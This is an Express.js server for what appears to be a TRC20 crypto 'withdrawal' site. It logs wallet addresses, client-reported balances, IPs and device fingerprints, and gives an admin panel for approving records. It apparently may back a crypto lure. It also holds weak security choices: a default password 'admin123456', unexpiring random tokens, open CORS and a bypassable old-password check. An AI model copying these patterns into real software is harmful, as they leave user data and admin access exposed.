const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const UAParser = require('ua-parser-js');
const geoip = require('geoip-lite');

const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const DATA_DIR = path.join(__dirname, 'data');
const RECORDS_FILE = path.join(DATA_DIR, 'records.json');
const CONFIG_FILE = path.join(DATA_DIR, 'config.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const DEFAULT_CONFIG = {
    adminPassword: process.env.ADMIN_PASSWORD || 'admin123456',
    dailyLimit: 1,
    telegramLink: 'https://t.me/your_default_support'
};

const readJson = (filePath, defaultVal = {}) => {
    try { if (fs.existsSync(filePath)) return JSON.parse(fs.readFileSync(filePath, 'utf8')); }
    catch (e) { console.error('读取失败:', filePath, e); }
    return defaultVal;
};
const writeJson = (filePath, data) => {
    try { fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8'); }
    catch (e) { console.error('写入失败:', filePath, e); }
};

let config = readJson(CONFIG_FILE, DEFAULT_CONFIG);
let configChanged = false;
for (const key in DEFAULT_CONFIG) {
    if (config[key] === undefined) { config[key] = DEFAULT_CONFIG[key]; configChanged = true; }
}
if (configChanged) writeJson(CONFIG_FILE, config);

let records = readJson(RECORDS_FILE, []);
if (!Array.isArray(records)) records = [];

const adminTokens = new Map();

const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token || !adminTokens.has(token)) return res.status(401).json({ error: '未授权或 Token 已过期' });
    next();
};

// ==================== 工具函数 ====================
function formatBeijingTime(iso) {
    try {
        const d = new Date(iso);
        if (isNaN(d.getTime())) return '';
        const bj = new Date(d.getTime() + 8 * 3600 * 1000);
        return bj.toISOString().replace('T', ' ').slice(0, 19);
    } catch { return ''; }
}

function guessDevice(ua) {
    const s = (ua || '').toLowerCase();
    if (/iphone|ipad|ipod/.test(s)) return 'ios';
    if (/android/.test(s)) return 'android';
    if (/windows|mac os|macintosh|linux|x11|cros/.test(s)) return 'desktop';
    return 'unknown';
}

function guessCountryByLang(lang) {
    const map = {
        zh:'CN', en:'US', es:'ES', hi:'IN', ar:'SA', pt:'BR', ru:'RU', ja:'JP',
        de:'DE', fr:'FR', ko:'KR', it:'IT', tr:'TR', vi:'VN', th:'TH', id:'ID',
        ms:'MY', nl:'NL', pl:'PL'
    };
    const l = (lang || '').toLowerCase().split('-')[0];
    return map[l] || '';
}

function detectCountry(ip, language) {
    if (ip) {
        let cleanIp = String(ip).split(',')[0].trim().replace(/^::ffff:/, '');
        if (cleanIp && cleanIp !== '::1' && !cleanIp.startsWith('127.') && !cleanIp.startsWith('10.') && !cleanIp.startsWith('192.168.')) {
            try {
                const geo = geoip.lookup(cleanIp);
                if (geo && geo.country) return geo.country;
            } catch (e) { console.warn('geoip lookup 失败:', e.message); }
        }
    }
    return guessCountryByLang(language);
}

// 判断该 IP 当天已经成功提现的次数（拒绝的不算）
function countTodayByIp(ip) {
    // 北京时间当天 00:00 对应的 UTC 时间戳
    const now = Date.now();
    const bjNow = now + 8 * 3600 * 1000;
    const bjMidnight = new Date(bjNow);
    bjMidnight.setUTCHours(0, 0, 0, 0);
    const utcMidnight = bjMidnight.getTime() - 8 * 3600 * 1000;

    return records.filter(r => {
        if (r.ip !== ip) return false;
        const t = new Date(r.createdAt || r.time || 0).getTime();
        if (isNaN(t) || t < utcMidnight) return false;
        // 只统计"待审核"和"已通过"的，被拒绝的不占次数
        const st = r.auditStatus || r.status || 'pending';
        return st === 'pending' || st === 'approved';
    }).length;
}

// ==================== 公共 API ====================

app.get('/api/public-settings', (req, res) => {
    res.json({ telegramLink: config.telegramLink || '' });
});

// 前端提交 TRC20 记录 —— 带 IP 每日次数限制
app.post('/api/records', (req, res) => {
    try {
        const ip = req.ip || req.connection.remoteAddress || '';
        const ua = req.headers['user-agent'] || '';

        // ★ IP 每日次数限制校验
        const used = countTodayByIp(ip);
        const limit = Number(config.dailyLimit) || 1;
        if (used >= limit) {
            return res.status(429).json({
                error: 'DAILY_LIMIT_REACHED',
                used: used,
                limit: limit
            });
        }

        const parser = new UAParser(ua);
        const browser = parser.getBrowser();
        const os = parser.getOS();

        const nowIso = new Date().toISOString();
        const body = req.body || {};
        const language = body.language || '';
        const country = detectCountry(ip, language);

        const newRecord = {
            id: Date.now() + '_' + Math.random().toString(36).slice(2, 8),
            address: body.address || '',
            balance: body.balance || '0.00',
            amount: body.balance || '0.00',
            language: language,
            ip: ip,
            userAgent: ua,
            device: guessDevice(ua),
            os: `${os.name || ''} ${os.version || ''}`.trim() || '未知系统',
            browser: `${browser.name || ''} ${browser.version || ''}`.trim() || '未知浏览器',
            country: country,
            visit_time: body.visitTime || nowIso,
            time: body.timestamp || nowIso,
            visit_time_local: formatBeijingTime(body.visitTime || nowIso),
            time_local: formatBeijingTime(body.timestamp || nowIso),
            auditStatus: 'pending',
            createdAt: body.timestamp || nowIso
        };

        records.push(newRecord);
        writeJson(RECORDS_FILE, records);

        res.json({ success: true, record: newRecord });
    } catch (e) {
        console.error('保存记录失败:', e);
        res.status(500).json({ error: '保存失败' });
    }
});

app.get('/api/records', authenticateToken, (req, res) => {
    res.json({ records: records.slice().reverse() });
});

app.get('/api/my-withdrawals', (req, res) => {
    const ip = req.ip || req.connection.remoteAddress || '';
    const mine = records.filter(r => r.ip === ip).slice(-10).reverse();
    res.json(mine);
});

// ==================== 管理员 API ====================

app.post('/api/login', (req, res) => {
    const { password } = req.body || {};
    if (password === config.adminPassword) {
        const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
        adminTokens.set(token, Date.now() + 24 * 60 * 60 * 1000);
        return res.json({ token });
    }
    res.status(401).json({ error: '密码错误' });
});

app.post('/api/audit', authenticateToken, (req, res) => {
    const { id, status, action } = req.body || {};
    const finalStatus = status || (action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : null);
    if (!finalStatus) return res.status(400).json({ error: '无效状态' });

    const rec = records.find(r => String(r.id) === String(id));
    if (!rec) return res.status(404).json({ error: '记录不存在' });
    if (rec.auditStatus === 'approved' || rec.auditStatus === 'rejected') {
        return res.status(409).json({ error: '该记录已审核' });
    }
    rec.auditStatus = finalStatus;
    rec.auditedAt = new Date().toISOString();
    writeJson(RECORDS_FILE, records);
    res.json({ success: true });
});

app.post('/api/audit-batch', authenticateToken, (req, res) => {
    const { ids, status, action } = req.body || {};
    const finalStatus = status || (action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : null);
    if (!finalStatus || !Array.isArray(ids)) return res.status(400).json({ error: '参数错误' });

    let updated = 0, skipped = 0;
    ids.forEach(id => {
        const rec = records.find(r => String(r.id) === String(id));
        if (!rec) { skipped++; return; }
        if (rec.auditStatus === 'approved' || rec.auditStatus === 'rejected') { skipped++; return; }
        rec.auditStatus = finalStatus;
        rec.auditedAt = new Date().toISOString();
        updated++;
    });
    writeJson(RECORDS_FILE, records);
    res.json({ success: true, updated, skipped });
});

app.get('/api/config', authenticateToken, (req, res) => {
    res.json({
        dailyLimit: config.dailyLimit,
        telegramLink: config.telegramLink || ''
    });
});

app.post('/api/config', authenticateToken, (req, res) => {
    const { dailyLimit } = req.body || {};
    const v = parseInt(dailyLimit, 10);
    if (isNaN(v) || v < 1 || v > 100) return res.status(400).json({ error: '限制必须在 1-100' });
    config.dailyLimit = v;
    writeJson(CONFIG_FILE, config);
    res.json({ success: true });
});

app.post('/api/admin/settings', authenticateToken, (req, res) => {
    const { telegramLink } = req.body || {};
    if (typeof telegramLink !== 'string') return res.status(400).json({ error: '无效链接' });
    config.telegramLink = telegramLink;
    writeJson(CONFIG_FILE, config);
    res.json({ success: true });
});

app.post('/api/change-password', authenticateToken, (req, res) => {
    const { oldPassword, newPassword } = req.body || {};
    if (oldPassword !== undefined && oldPassword !== config.adminPassword) {
        return res.status(401).json({ error: '当前密码错误' });
    }
    if (!newPassword || newPassword.length < 6) {
        return res.status(400).json({ error: '新密码至少 6 位' });
    }
    config.adminPassword = newPassword;
    writeJson(CONFIG_FILE, config);
    res.json({ success: true });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
